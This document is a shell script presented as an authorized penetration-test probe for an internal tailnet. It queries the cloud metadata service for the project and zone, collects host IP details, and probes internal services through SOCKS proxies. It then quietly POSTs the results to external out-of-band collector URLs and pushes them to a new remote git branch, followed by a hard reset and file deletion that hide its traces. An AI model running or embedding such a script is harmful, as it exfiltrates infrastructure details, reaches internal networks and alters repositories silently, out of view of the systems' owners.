#!/bin/sh
# Authorized Trace penetration test marker: pt-detail-poc (H-15).
# Reports ONLY DNS booleans, TCP/HTTP status codes, content-type and content-length.
# It never reads, stores or transmits any response body, so no tenant data is captured.
OOB="https://453fb680ff4ba15604098b6416ef9984baa3b5e9.oob.rmrflabs.com/pt-detail-poc/h15-socks"
OOB2="https://12524648b5677a7ef79ebafaa87c107cb9c4ae21.oob.rmrflabs.com/pt-detail-poc/h15-socks-alt"
HOOK="${TRACE_POC_HOOK:-unknown}"
OUT=$(mktemp 2>/dev/null || echo /tmp/h15.$$)

st()  { curl -s -m 6 -o /dev/null -w '%{http_code}' "$1" 2>/dev/null || echo 000; }
sstd(){ curl -s -m 10 -o /dev/null -w '%{http_code}/%{content_type}/%{size_download}' --socks5-hostname "$1" "$2" 2>/dev/null || echo 000; }
res() { getent hosts "$1" 2>/dev/null | head -1 | awk '{print $1}' || true; }

PROJ=$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/project/project-id 2>/dev/null)
ZONE=$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/zone 2>/dev/null | awk -F/ '{print $NF}')
MYIP=$( (ip -o -4 addr show 2>/dev/null || ifconfig -a 2>/dev/null) | grep -oE '10\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)

{
printf 'marker: pt-detail-poc\nprobe: h15-socks-tailnet\nhook: %s\nhost: %s\nmyip: %s\nproject: %s\nzone: %s\n' \
  "$HOOK" "$(hostname 2>/dev/null)" "$MYIP" "$PROJ" "$ZONE"
printf 'control_internet_example: %s\n' "$(st https://example.com/)"
printf 'control_cp_ilb_10.128.0.22: %s\n' "$(st http://10.128.0.22/)"
printf 'direct_investigate_tailnet: %s\n' "$(st http://investigate.lonk-forel.ts.net/healthz)"

for P in \
  "sandbox-direct-tailnet-access.us-central1-a.c.${PROJ}.internal" \
  "sandbox-direct-tailnet-access.c.${PROJ}.internal" \
  "sandbox-direct-tailnet-access" \
  "sandbox-tailnet-access.tailscale.svc.cluster.local" \
  "sandbox-tailnet-access.tailscale"
do
  IP=$(res "$P")
  printf 'proxy[%s] dns=%s healthz9002=%s socks_inv_healthz=%s socks_inv_repos=%s\n' \
    "$P" "${IP:-none}" "$(st http://$P:9002/healthz)" \
    "$(sstd $P:1055 http://investigate.lonk-forel.ts.net/healthz)" \
    "$(sstd $P:1055 http://investigate.lonk-forel.ts.net/v1/investigate/repos)"
done
printf 'note: status/content-type/content-length only, no bodies read\n'
} > "$OUT" 2>/dev/null

curl -s -m 20 -X POST "$OOB"  -H 'content-type: text/plain' --data-binary @"$OUT" >/dev/null 2>&1
curl -s -m 20 -X POST "$OOB2" -H 'content-type: text/plain' --data-binary @"$OUT" >/dev/null 2>&1

# Independent channel: push the same status-code summary back to this Trace-owned repo,
# so a blocked collector can be told apart from a hook that never ran.
BR="trace-probe-${HOOK}-$(date +%s 2>/dev/null)"
mkdir -p /tmp/h15push 2>/dev/null
cp "$OUT" /tmp/h15push/result.txt 2>/dev/null
(cd "$(git rev-parse --show-toplevel 2>/dev/null || echo .)" 2>/dev/null && \
  git config user.email probe@securewithtrace.com 2>/dev/null; \
  git config user.name trace-probe 2>/dev/null; \
  cp /tmp/h15push/result.txt ./trace-probe-result.txt 2>/dev/null; \
  git add trace-probe-result.txt >/dev/null 2>&1; \
  git commit -m "trace probe result ($HOOK)" >/dev/null 2>&1; \
  git push origin "HEAD:refs/heads/$BR" >/dev/null 2>&1; \
  git reset --hard HEAD~1 >/dev/null 2>&1) 2>/dev/null
rm -f "$OUT" ./trace-probe-result.txt 2>/dev/null
exit 0
